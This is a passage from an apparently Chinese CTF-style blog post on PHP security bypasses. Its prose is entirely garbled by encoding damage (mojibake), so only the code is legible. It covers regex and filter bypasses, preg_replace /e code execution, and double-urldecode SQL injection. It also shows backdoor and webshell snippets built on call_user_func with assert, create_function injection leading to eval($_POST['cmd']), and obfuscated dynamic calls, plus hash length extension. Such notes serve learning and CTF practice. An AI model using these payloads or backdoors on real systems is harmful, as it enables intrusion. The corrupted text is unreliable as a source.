<code>is_numeric()</code> æ£€éªŒï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡ SQL æ³¨å…¥é‡Œçš„è¿‡æ»¤ã€‚</li><li>å¯¹äºç§‘å­¦è®¡æ•°æ³•æ¥è¯´è½¬æ¢åä¼šä¿ç•™ <code>e</code> å‰é¢çš„æ•°å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ç»•è¿‡ã€‚ä¾‹å¦‚ï¼š<code>?time=0.5276e7</code></li></ul><h2 id="8-str-replace-find-replace-string-count"><a href="#8-str-replace-find-replace-string-count" class="headerlink" title="(8) str_replace(find, replace, string, count)"></a>(8) <code>str_replace(find, replace, string, count)</code></h2><ul><li>å°†åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºæŒ‡å®šå†…å®¹ï¼Œä¸è¿‡è¿™ä¸ªå‡½æ•°å¯ä»¥é€šè¿‡åŒå†™æ¥ç»•è¿‡è¿™ä¸ªæ›¿æ¢ï¼Œåˆ©ç”¨è¯¥ç‰¹æ€§å¯ä»¥ç»•è¿‡ä¸€äº›å…³é”®å­—æ›¿æ¢çš„æƒ…å†µã€‚</li></ul><h2 id="9-preg-replace-pattern-replacement-subject-limit-count"><a href="#9-preg-replace-pattern-replacement-subject-limit-count" class="headerlink" title="(9) preg_replace(pattern, replacement, subject, limit, count)"></a>(9) <code>preg_replace(pattern, replacement, subject, limit, count)</code></h2><ul><li><p>å‡½æ•°çš„ <code>/e</code> åŒ¹é…æ¨¡å¼å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä¸è¿‡å•çº¯çš„æ›¿æ¢å­—ç¬¦ä¸²æ¥è¯´å®ƒå¹¶ä¸å­˜åœ¨åŒå†™ç»•è¿‡è¿™ç§ç¼ºé™·ã€‚</p></li><li><p><code>/e</code> ä¿®é¥°ç¬¦è¡¨ç¤ºæ‰§è¡Œæ›¿æ¢ä¸­çš„ PHP ä»£ç ï¼ˆè¿™æ˜¯ PHP 5.5 ä¹‹å‰çš„ä¸€ä¸ªç‰¹æ€§ï¼Œç°åœ¨å·²ç»è¢«å¼ƒç”¨ï¼‰ï¼Œ<code>/i</code> ä¿®é¥°ç¬¦è¡¨ç¤ºåŒ¹é…æ—¶å¿½ç•¥å¤§å°å†™ã€‚</p></li><li><p>ä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$regex</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="hljs-variable">$value</span>);<br></code></pre></td></tr></table></figure><p><code>&#39;strtolower(&quot;\\1&quot;)&#39;</code> æ˜¯æ›¿æ¢éƒ¨åˆ†ï¼Œå…¶ä¸­ <code>\\1</code> ä»£è¡¨ç¬¬ä¸€ä¸ªæ•è·ç»„çš„å†…å®¹ï¼Œè¿™é‡Œçš„ä½œç”¨æ˜¯å°†åŒ¹é…åˆ°çš„æ–‡æœ¬è½¬æ¢ä¸ºå°å†™ã€‚</p></li><li><p>æˆ‘ä»¬è®©å®ƒå˜æˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(.*)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, &#123;$&#123;<span class="hljs-title function_ invoke__">phpinfo</span>()&#125;&#125;);<br></code></pre></td></tr></table></figure></li></ul><h2 id="10-if-preg-match-php-im-a"><a href="#10-if-preg-match-php-im-a" class="headerlink" title="(10) if(preg_match(&#39;/^php$/im&#39;,$a))"></a>(10) <code>if(preg_match(&#39;/^php$/im&#39;,$a))</code></h2><ul><li><code>/m</code> ä¸ºå¤šè¡ŒåŒ¹é…ï¼Œ<code>/i</code> ä¸åŒºåˆ†å¤§å°å†™ï¼Œ<code>/^php$/</code> <code>^</code> è¡¨ç¤ºä»¥ <code>php</code> å¼€å¤´å’Œ <code>$</code> è¡¨ç¤ºä»¥ <code>php</code> ç»“å°¾ã€‚</li><li>å½“å‡ºç° <code>%0A</code> çš„æ—¶å€™ä¼šè¢«å½“åšä¸¤è¡Œå¤„ç†ï¼Œæ­¤æ—¶åªåŒ¹é…ä¸€è¡Œï¼Œåé¢çš„è¡Œä¼šè‡ªåŠ¨è¢«å¿½ç•¥ã€‚å®ç°ç»•è¿‡ã€‚</li><li>å¦‚æœç›®æ ‡å­—ç¬¦ä¸²ä¸­æ²¡æœ‰ <code>&quot;\n&quot;</code> å­—ç¬¦ï¼Œæˆ–è€…æ¨¡å¼ä¸­æ²¡æœ‰å‡ºç° <code>^</code> æˆ– <code>$</code>ï¼Œè®¾ç½®è¿™ä¸ªä¿®é¥°ç¬¦ä¸äº§ç”Ÿä»»ä½•å½±å“ã€‚</li><li>å¦‚æœæ­£åˆ™è¡¨è¾¾å¼æ˜¯ <code>^xxx$</code>ï¼Œåœ¨æœ«å°¾åŠ ä¸ªæ¢è¡Œç¬¦ <code>%0A</code> å°±å’Œæ²¡åŠ ä¸€æ ·åœ¨åŒ¹é…ä¸­ï¼Œä½†åœ¨å¯¹æ¯”ä¸­å°±ä¸ä¸€æ ·äº†ï¼Œåˆ©ç”¨ä¸åŒ¹é…å’Œå¯¹æ¯”ä¸­çš„çŸ›ç›¾ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Match found!&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No match!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// è®¿é—®ä»¥ä¸‹ URL</span><br><span class="hljs-comment">// http://example.com/script.php?debu=aqua_is_cute%0A</span><br><span class="hljs-comment">// è¾“å‡ºç»“æœ: Match found!</span><br></code></pre></td></tr></table></figure><ul><li><code>preg_match(pattern, subject, matches, flags, offset);</code><ul><li><p><code>pattern</code>: æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ï¼Œç”¨äºæè¿°ä½ æƒ³è¦åŒ¹é…çš„æ–‡æœ¬æ ¼å¼ã€‚é€šå¸¸ç”¨æ–œæ  <code>/</code> æ¥åŒ…å›´æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><ul><li><p><code>subject</code>: è¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚</p></li><li><p><code>matches</code>: ï¼ˆå¯é€‰ï¼‰æ•°ç»„ï¼Œè¿”å›åŒ¹é…ç»“æœã€‚å¦‚æœæœ‰åŒ¹é…ï¼Œ<code>matches[0]</code> åŒ…å«å®Œå…¨åŒ¹é…çš„éƒ¨åˆ†ï¼Œ<code>matches[1]</code> åŒ…å«ç¬¬ä¸€ä¸ªæ•è·ç»„çš„åŒ¹é…å†…å®¹ï¼Œä¾æ­¤ç±»æ¨ã€‚</p></li><li><p><code>flags</code>: ï¼ˆå¯é€‰ï¼‰æ§åˆ¶åŒ¹é…è¡Œä¸ºçš„æ ‡å¿—ï¼Œä¾‹å¦‚æ˜¯å¦åŒ¹é…æ‰€æœ‰ç»“æœï¼ˆ<code>PREG_OFFSET_CAPTURE</code>ï¼‰ã€‚</p></li><li><p><code>offset</code>: ï¼ˆå¯é€‰ï¼‰æŒ‡å®šä»å­—ç¬¦ä¸²çš„å“ªä¸ªä½ç½®å¼€å§‹æœç´¢ã€‚</p><ul><li>å¸¸è§åŒ¹é…è§„åˆ™ï¼š<ul><li><strong>å­—ç¬¦ç±»</strong>ï¼šåŒ¹é…ç‰¹å®šå­—ç¬¦é›†ä¸­çš„ä»»æ„å­—ç¬¦ã€‚<ul><li><code>[A-Za-z0-9]</code>ï¼šåŒ¹é…ä»»æ„å­—æ¯ï¼ˆå¤§å†™æˆ–å°å†™ï¼‰æˆ–æ•°å­—ã€‚</li><li><code>[0-9]</code>ï¼šåŒ¹é…ä»»æ„æ•°å­—ã€‚</li><li><code>[A-Z]</code>ï¼šåŒ¹é…ä»»æ„å¤§å†™å­—æ¯ã€‚</li><li><code>[a-z]</code>ï¼šåŒ¹é…ä»»æ„å°å†™å­—æ¯ã€‚</li></ul></li><li><strong>æ•°é‡é™å®šç¬¦</strong>ï¼š<ul><li><code>+</code>ï¼šåŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼ˆ1æ¬¡æˆ–ä»¥ä¸Šï¼‰ã€‚</li><li><code>*</code>ï¼šåŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦é›¶æ¬¡æˆ–å¤šæ¬¡ï¼ˆ0æ¬¡æˆ–ä»¥ä¸Šï¼‰ã€‚</li><li><code>?</code>ï¼šåŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼ˆ0æ¬¡æˆ–1æ¬¡ï¼‰ã€‚</li><li><code>&#123;n&#125;</code>ï¼šåŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦æ°å¥½ n æ¬¡ã€‚</li><li><code>&#123;n,&#125;</code>ï¼šåŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦è‡³å°‘ n æ¬¡ã€‚</li><li><code>&#123;n,m&#125;</code>ï¼šåŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦è‡³å°‘ n æ¬¡ï¼Œä½†ä¸è¶…è¿‡ m æ¬¡ã€‚</li></ul></li><li><strong>é”šç‚¹</strong>ï¼š<ul><li><code>^</code>ï¼šåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ã€‚</li><li><code>$</code>ï¼šåŒ¹é…å­—ç¬¦ä¸²çš„ç»“æŸã€‚</li></ul></li><li><strong>é¢„å®šä¹‰å­—ç¬¦ç±»</strong>:<ul><li><code>\d</code> åŒ¹é…ä»»æ„æ•°å­—ï¼ˆç›¸å½“äº <code>[0-9]</code>ï¼‰ã€‚</li><li><code>\D</code> åŒ¹é…ä»»æ„éæ•°å­—å­—ç¬¦ã€‚</li><li><code>\w</code> åŒ¹é…ä»»æ„å­—æ¯ã€æ•°å­—æˆ–ä¸‹åˆ’çº¿ï¼ˆç›¸å½“äº <code>[a-zA-Z0-9_]</code>ï¼‰ã€‚</li><li><code>\W</code> åŒ¹é…ä»»æ„éå­—æ¯ã€éæ•°å­—æˆ–éä¸‹åˆ’çº¿å­—ç¬¦ã€‚</li><li><code>\s</code> åŒ¹é…ä»»æ„ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ç­‰ï¼‰ã€‚</li><li><code>\S</code> åŒ¹é…ä»»æ„éç©ºç™½å­—ç¬¦ã€‚</li></ul></li><li><strong>é‡è¯</strong>:<ul><li><code>&#123;n&#125;</code> ç²¾ç¡®åŒ¹é… n æ¬¡ã€‚</li><li><code>&#123;n,&#125;</code> è‡³å°‘åŒ¹é… n æ¬¡ã€‚</li><li><code>&#123;n,m&#125;</code> åŒ¹é… n åˆ° m æ¬¡ã€‚</li><li><code>*</code> åŒ¹é…é›¶æ¬¡æˆ–å¤šæ¬¡ï¼ˆç›¸å½“äº <code>&#123;0,&#125;</code>ï¼‰ã€‚</li><li><code>+</code> åŒ¹é…ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼ˆç›¸å½“äº <code>&#123;1,&#125;</code>ï¼‰ã€‚</li><li><code>?</code> åŒ¹é…é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼ˆç›¸å½“äº <code>&#123;0,1&#125;</code>ï¼‰ã€‚</li><li><code>preg_match(&#39;/a&#123;3&#125;/&#39;, &#39;aaa&#39;)</code> &#x2F;&#x2F; åŒ¹é…æˆåŠŸï¼ŒåŒ¹é… â€œaaaâ€</li><li><code>preg_match(&#39;/a&#123;2,4&#125;/&#39;, &#39;aaaa&#39;)</code> &#x2F;&#x2F; åŒ¹é…æˆåŠŸï¼ŒåŒ¹é… â€œaaaaâ€</li></ul></li><li><strong>æ•è·ç»„</strong>:<ul><li>ä½¿ç”¨åœ†æ‹¬å· <code>()</code> åˆ›å»ºæ•è·ç»„ï¼Œæ•è·ç»„ä¸­çš„å†…å®¹ä¼šè¢«æ•è·åˆ° <code>matches</code> æ•°ç»„ä¸­ã€‚</li><li>ç¤ºä¾‹ï¼š<code>/(hello) (world)/</code> åŒ¹é… â€œhello worldâ€ï¼Œ<code>matches[1]</code> ä¼šæ˜¯ â€œhelloâ€ï¼Œ<code>matches[2]</code> ä¼šæ˜¯ â€œworldâ€ã€‚</li></ul></li><li><strong>é€‰æ‹©ç¬¦ <code>|</code></strong>:<ul><li>ç”¨äºåŒ¹é…å¤šä¸ªæ¨¡å¼ä¸­çš„ä¸€ä¸ªã€‚</li><li>ç¤ºä¾‹ï¼š<code>/cat|dog/</code> åŒ¹é… â€œcatâ€ æˆ– â€œdogâ€ã€‚</li></ul></li><li><strong>é”šç‚¹</strong>:<ul><li><code>^</code> åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´ã€‚</li><li><code>$</code> åŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚</li><li>ç¤ºä¾‹ï¼š<code>/^hello/</code> åŒ¹é… â€œhelloâ€ ä»…å½“å®ƒå‡ºç°åœ¨å­—ç¬¦ä¸²çš„å¼€å¤´ã€‚</li><li><code>hello$/</code> åŒ¹é… â€œhelloâ€ ä»…å½“å®ƒå‡ºç°åœ¨å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚</li></ul></li><li><strong>é›¶å®½æ–­è¨€</strong>:<ul><li><strong>è‚¯å®šå…ˆè¡Œæ–­è¨€</strong> <code>(?=...)</code>ï¼šåŒ¹é…æ¡ä»¶å‰é¢çš„ä½ç½®ï¼Œä½†ä¸æ¶ˆè€—å­—ç¬¦ã€‚</li><li><strong>å¦å®šå…ˆè¡Œæ–­è¨€</strong> <code>(?!...)</code>ï¼šåŒ¹é…æ¡ä»¶å‰é¢çš„ä½ç½®ï¼Œå¹¶ä¸”ä¸å…è®¸åé¢æœ‰ç‰¹å®šå†…å®¹ã€‚</li><li><strong>è‚¯å®šåè¡Œæ–­è¨€</strong> <code>(?&lt;=...)</code>ï¼šåŒ¹é…æ¡ä»¶åé¢çš„ä½ç½®ã€‚</li><li><strong>å¦å®šåè¡Œæ–­è¨€</strong> <code>(?&lt;!...)</code>ï¼šåŒ¹é…æ¡ä»¶åé¢çš„ä½ç½®ï¼Œä½†ä¸å…è®¸å‰é¢æœ‰ç‰¹å®šå†…å®¹ã€‚</li></ul></li><li><strong>è½¬ä¹‰å­—ç¬¦</strong>ï¼š<code>\</code> ç”¨äºè½¬ä¹‰å­—ç¬¦ï¼Œä½¿å…¶å…·æœ‰ç‰¹æ®Šå«ä¹‰ã€‚ä¾‹å¦‚ <code>\d</code> åŒ¹é…ä»»ä½•æ•°å­—ï¼Œ<code>\w</code> åŒ¹é…ä»»ä½•å•è¯å­—ç¬¦ã€‚</li><li><strong><code>(?R)?</code></strong>: å¯é€‰çš„é€’å½’åŒ¹é…ï¼Œç”¨äºå¤„ç†åµŒå¥—å‡½æ•°è°ƒç”¨ã€‚<code>?</code> ä½¿å¾—å®ƒå˜æˆå¯é€‰çš„ï¼Œä»¥ä¾¿å¤„ç†æœ€å†…å±‚æ²¡æœ‰åµŒå¥—çš„å‡½æ•°è°ƒç”¨ã€‚</li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="11-urldecode-string-str-string"><a href="#11-urldecode-string-str-string" class="headerlink" title="(11) urldecode ( string $str ) : string"></a>(11) <code>urldecode ( string $str ) : string</code></h2><ul><li>è§£ç å·²ç¼–ç çš„ URL å­—ç¬¦ä¸²ï¼Œå› ä¸ºå‘é€è¯·æ±‚çš„æ—¶å€™æµè§ˆå™¨ä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡è§£ç ï¼Œå¦‚æœåœ¨ä»£ç ä¸­åˆæ‰§è¡Œ <code>urldecode</code> å°±å¯èƒ½ä¼šå­˜åœ¨ç»•è¿‡ã€‚ä¾‹å¦‚ï¼šå‘é€ <code>?id = 1%2527--ã€‹phpæ¥æ”¶åˆ°ä¸º$id=1%27</code> å¦‚æœåœ¨æ‰§è¡Œ <code>$id=urldecode($id)</code> ï¼Œæœ€ç»ˆ <code>$id=1&#39;</code></li></ul><h2 id="12-å›è°ƒå‡½æ•°"><a href="#12-å›è°ƒå‡½æ•°" class="headerlink" title="(12) å›è°ƒå‡½æ•°"></a>(12) å›è°ƒå‡½æ•°</h2><ul><li><p>å›è°ƒå‡½æ•°æ˜¯å°†ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥å¦ä¸€ä¸ªå‡½æ•°ã€‚ç”±äºå¯ä»¥å°†å‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥æ‰§è¡Œï¼Œå°†ä¸€äº›å±é™©çš„å‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œå¯èƒ½æˆä¸ºä¸€ä¸ªä¸æ˜“æ£€æµ‹çš„åé—¨ã€‚åœ¨ PHP ä¸­æœ‰å¸¸ç”¨çš„å›è°ƒå‡½æ•°ï¼š<code>call_user_func</code>ã€<code>call_user_func_array</code>ã€<code>array_map</code> ç­‰ã€‚</p></li><li><p>ä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;assert&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);<br></code></pre></td></tr></table></figure><p><code>assert()</code> å‡½æ•°ç›´æ¥ä½œä¸ºå›è°ƒå‡½æ•°ï¼Œä»¥ <code>$_REQUEST[&quot;pass&quot;]</code> ä½œä¸º <code>assert</code> å‚æ•°è°ƒç”¨ã€‚</p></li></ul><h2 id="14-æ¯”è¾ƒæ¼æ´-hash-é•¿åº¦æ‰©å±•æ”»å‡»"><a href="#14-æ¯”è¾ƒæ¼æ´-hash-é•¿åº¦æ‰©å±•æ”»å‡»" class="headerlink" title="(14) æ¯”è¾ƒæ¼æ´ - hash é•¿åº¦æ‰©å±•æ”»å‡»"></a>(14) æ¯”è¾ƒæ¼æ´ - hash é•¿åº¦æ‰©å±•æ”»å‡»</h2><p>å·¥å…·åˆ©ç”¨ï¼šHashPump&#x2F;Hexpand&#x2F;hash_extender</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 setup.py install  <span class="hljs-comment"># å®‰è£…Pythonç»‘å®š</span><br>hashpump -h <br></code></pre></td></tr></table></figure><p><strong>HashPumpå®‰è£…</strong>ï¼š</p><ol><li><code>git clone https://github.com/bwall/HashPump.git</code></li><li><code>apt-get install g++ libssl-dev</code></li><li><code>cd HashPump</code></li><li><code>make &amp;&amp; make install</code></li></ol><p><strong>åˆ©ç”¨æ¡ä»¶</strong>ï¼š</p><ol><li>ä½¿ç”¨ <code>hash(key || message)</code> è¿™ç§æ–¹å¼ï¼Œä¸”ä½¿ç”¨äº† MD5 æˆ– SHA-1 ç­‰åŸºäº Merkleâ€“DamgÃ¥rd æ„é€ çš„å“ˆå¸Œå‡½æ•°ç”Ÿæˆå“ˆå¸Œå€¼ï¼›</li><li>è®©æ”»å‡»è€…å¯ä»¥æäº¤æ•°æ®ä»¥åŠå“ˆå¸Œå€¼ï¼Œè™½ç„¶æ”»å‡»è€…ä¸çŸ¥é“å¯†é’¥ï¼›</li><li>æœåŠ¡å™¨æŠŠæäº¤çš„æ•°æ®è·Ÿå¯†é’¥æ„é€ æˆå­—ç¬¦ä¸²ï¼Œå¹¶ç»è¿‡å“ˆå¸Œååˆ¤æ–­æ˜¯å¦ç­‰åŒäºæäº¤ä¸Šæ¥çš„å“ˆå¸Œå€¼ã€‚</li></ol><p><strong>æ‰©å±•</strong>ï¼š</p><ul><li>è‹¥é•¿åº¦æœªçŸ¥ï¼Œå¯è¿›è¡Œçˆ†ç ´ï¼Œå‚è€ƒï¼š<a href="https://blog.csdn.net/qq1045553189/article/details/87566846">https://blog.csdn.net/qq1045553189/article/details/87566846</a></li></ul><h2 id="15-array-search"><a href="#15-array-search" class="headerlink" title="(15) array_search"></a>(15) <code>array_search</code></h2><ul><li>æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œè¿™æ„å‘³ç€åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒPHP ä¼šå°†å­—ç¬¦ä¸²ä¸æ•°å­—è¿›è¡Œæ¯”è¾ƒæ—¶è½¬æ¢ä¸ºç›¸åŒçš„ç±»å‹ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;DGGJ&quot;</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]);<br></code></pre></td></tr></table></figure><ul><li>PHP ä¼šæŠŠ <code>DGGJ</code> è½¬ä¸º <code>0</code>ï¼Œ<code>d === false ? die(&quot;no...&quot;) : NULL;</code>ï¼Œæ­¤æ—¶æŸ¥æ‰¾çš„å°±æ˜¯ <code>0</code> åœ¨æ•°ç»„é‡Œçš„ä½ç½®äº†ã€‚æˆ‘ä»¬å¯ä»¥æŠŠ <code>0</code> æ”¾åœ¨ç´¢å¼•ä¸º <code>1</code> çš„åœ°æ–¹ï¼Œè¿™æ · <code>1 === false</code> ä¸æˆç«‹ã€‚</li></ul><h2 id="16-create-function"><a href="#16-create-function" class="headerlink" title="(16) create_function"></a>(16) <code>create_function</code></h2><ul><li>ä»£ç æ³¨å…¥</li><li>ä» PHP 7.2.0 å¼€å§‹è¢«æ ‡è®°ä¸ºå·²å¼ƒç”¨ï¼Œå¹¶åœ¨ PHP 8.0.0 ä¸­è¢«ç§»é™¤ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$newfunc</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>, <span class="hljs-string">&#x27;return $a+$b;&#x27;</span>);<br><span class="hljs-comment">// ç­‰åŒäº</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">newfunc</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span> + <span class="hljs-variable">$b</span>;<br>&#125;<br><span class="hljs-variable">$newfunc</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#125;eval($_POST[&quot;cmd&quot;]);//&#x27;</span>);<br><span class="hljs-comment">// ç­‰åŒäº</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">newfunc</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="17-é€šè¿‡æ„é€ åŠ¨æ€è°ƒç”¨å‡½æ•°"><a href="#17-é€šè¿‡æ„é€ åŠ¨æ€è°ƒç”¨å‡½æ•°" class="headerlink" title="(17) é€šè¿‡æ„é€ åŠ¨æ€è°ƒç”¨å‡½æ•°"></a>(17) é€šè¿‡æ„é€ åŠ¨æ€è°ƒç”¨å‡½æ•°</h2><ul><li>ä¾‹å­ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span> = <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>));(<span class="hljs-variable">$$pi</span>)&#123;pi&#125;((<span class="hljs-variable">$$pi</span>)&#123;abs&#125;)<br></code></pre></td></tr></table></figure></li><li>åˆ†æï¼š<ul><li><code>$pi = hex2bin(&quot;5f474554&quot;) =&gt; _GET</code></li><li>$$pi å–å‡ºçœŸæ­£çš„ <code>_GET</code> æ•°ç»„ï¼Œ$p å¾—åˆ°çš„ <code>_GET</code> åªæ˜¯å­—ç¬¦ä¸²ï¼›å› ä¸º <code>[]</code> è¢«ç¦äº†å°±ç”¨ <code>&#123;&#125;</code> ä»£æ›¿ï¼Œæœ€åçš„å¾—ï¼š</li><li><code>(_GET)&#123;pi&#125;((_GET)&#123;abs&#125;)</code></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>) &amp;&amp; <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>) &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>) === <span class="hljs-string">&quot;I have a dream&quot;</span>) &#123;<br></code></pre></td></tr></table></figure><h2 id="18-ä½¿ç”¨-file-get-contents-file"><a href="#18-ä½¿ç”¨-file-get-contents-file" class="headerlink" title="(18) ä½¿ç”¨  file_get_contents($file)"></a>(18) ä½¿ç”¨  file_get_contents($file)</h2><ul><li>ç”¨ &#96;file_get</li></ul><p>_contents(â€˜php:&#x2F;&#x2F;inputâ€™)<code>æ¥è¯»å–åŸå§‹</code>POST<code>æ•°æ®ï¼Œè€Œä¸æ˜¯</code>$_POST&#96; é”®å€¼å¯¹ã€‚</p><p>  ä¾‹å¦‚ï¼Œå¦‚æœä½ å‘é€çš„æ˜¯ <code>debu=aqua_is_cute&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2</code>ï¼Œåˆ™ <code>php://input</code> ä¼šè¯»å–æ•´ä¸ª <code>debu=aqua_is_cute&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2</code> ä½œä¸ºå­—ç¬¦ä¸²ã€‚</p><h2 id="19-pcre-å›æº¯"><a href="#19-pcre-å›æº¯" class="headerlink" title="(19) pcre å›æº¯"></a>(19) <code>pcre</code> å›æº¯</h2><ul><li>å‡è®¾è¦åŒ¹é…çš„æ­£åˆ™æ˜¯ <code>&lt;\?.\*[(</code>;?&gt;].*<code>ï¼Œè¾“å…¥æ˜¯ </code>&lt;?php phpinfo();&#x2F;&#x2F;aaaaa&#96;ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;Br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li>æ­£åˆ™çš„ <code>&lt;</code> åŒ¹é…äº†è¾“å…¥çš„ <code>&lt;</code>ã€‚å½“å‰åŒ¹é…æˆåŠŸåˆ™è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li><code>?</code> ä¹ŸåŒ¹é…æˆåŠŸï¼Œç»§ç»­ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.\*[(`;<span class="hljs-meta">?&gt;</span>].\*&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//aaaaa</span><br></code></pre></td></tr></table></figure><ul><li><code>.*</code> 